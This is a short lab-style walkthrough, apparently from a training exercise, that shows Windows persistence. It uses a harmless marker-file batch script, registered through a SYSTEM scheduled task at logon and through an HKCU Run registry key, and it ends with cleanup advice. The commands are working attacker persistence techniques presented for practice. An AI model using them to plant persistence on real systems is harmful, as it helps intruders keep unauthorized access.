Windows Persistence: Scheduled Tasks & Registry

A guided walkthrough of establishing persistence on Windows using common techniques.

# 1. Create a simple persistence script (C:\Temp\persistent.bat)
@echo off
echo This system is compromised! > C:\Users\Public\compromised_marker.txt
exit
# 2. Steps for Scheduled Task Persistence
schtasks /create /tn "Cohortia_Persistent_Task" /tr "C:\Temp\persistent.bat" /sc ONLOGON /ru SYSTEM /f
schtasks /query /tn "Cohortia_Persistent_Task"
# 3. Steps for Registry Run Key Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cohortia_Persistence" /t REG_SZ /d "C:\Temp\persistent.bat" /f
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cohortia_Persistence"

Scenario Overview

  • **Goal:** Establish persistence on a Windows machine with Administrator privileges.
  • **Payload:** A simple batch script that creates a marker file.
  • **Methods:** Scheduled Tasks and Registry Run Keys.

Verification & Cleanup

After implementing, log off and back on to verify the compromised_marker.txt file. Remember to clean up all artifacts (task, registry entry, files) after the exercise for safety.

Key Takeaway

Hands-on practice with Scheduled Tasks and Registry Run Keys demonstrates their effectiveness in establishing Windows persistence.
